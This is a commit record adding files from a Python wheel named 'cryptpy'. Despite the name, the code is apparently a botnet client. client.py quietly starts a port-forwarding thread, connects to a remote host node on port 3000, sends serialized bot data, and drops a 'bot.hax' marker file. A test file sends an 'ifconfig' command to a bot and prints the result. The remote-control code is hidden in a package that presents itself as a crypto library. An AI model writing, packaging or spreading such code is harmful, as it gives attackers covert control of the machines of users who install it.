8008a6657907dcbc1093d1fb94c39b116a14161d
Bot <41898282+github-actions[bot]@users.noreply.github.com>
2023-08-06 07:10:16 +0000

    Add package cryptpy/0.3.4/cryptpy-0.3.4-py3-none-any.whl

---
+++ packages/cryptpy/cryptpy-0.3.4-py3-none-any.whl/src/bot/bot_test.py
@@ -0,0 +1,11 @@
+from src.bot import bot
+
+bot.ImportTest() # Test importable
+
+test_bot = bot.Bot(
+    '192.168.1.14',
+)
+
+ifconfig = test_bot.send_command("ifconfig") # Send command
+
+print(ifconfig) # Log output
---
+++ packages/cryptpy/cryptpy-0.3.4-py3-none-any.whl/src/networking/client.py
@@ -0,0 +1,57 @@
+import socket
+import sys
+import os
+import threading
+from src.common import common
+from src.common import commonio
+from src.bot import bot
+from src.common.commondefs import false
+from src.common.commondefs import true
+
+class Client:
+    def __init__(self, botRef: bot.Bot):
+        self.bot = bot.Bot
+        self.hostNode = common.RemoteAddr # Set host node addr for persistency
+        self.bot.host = botRef.host # Set host for persistency
+
+        if os.path.isfile('bot.hax') == false:
+            self.RegisterClient() # Register client
+    
+    def RegisterClient(self):
+        print('\n-- INFO -- registering client...\n') # Log begin
+
+        if self.hostNode == '': # Check for nil host node
+            return 'invalid host node' # Return error
+        
+        try:
+            portThread = threading.Thread(target=common.forwardPortStandard) # Init port thread
+            portThread.daemon = true # Run as background thread
+            portThread.start() # Start port forwarding thread
+        except Exception as e:
+            print(e) # Log found error
+
+        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # Init socket
+
+        sock.connect((common.RemoteAddr, 3000)) # Connect socket
+
+        print('-- CONNECTION -- connecting to host node with bot address '+self.bot.host)
+
+        bot = self.bot # Get reference to bot
+
+        serialized = bot.params_to_bytes(bot) # Attempt to serialize
+
+        print('serialized bot data')
+
+        sock.sendall(serialized) # Send self bot reference
+
+        print('attempted to send '+str(len(serialized))+' bits of data') # Log send
+
+        sock.close() # Close socket
+
+        print('successfully wrote '+str(len(serialized))+' bits of data') # Log success
+
+        print('-- CONNECTION-- closing connection\n')
+
+        f = open('bot.hax', 'w') # Open file
+
+        f.write('despacito') # Write success
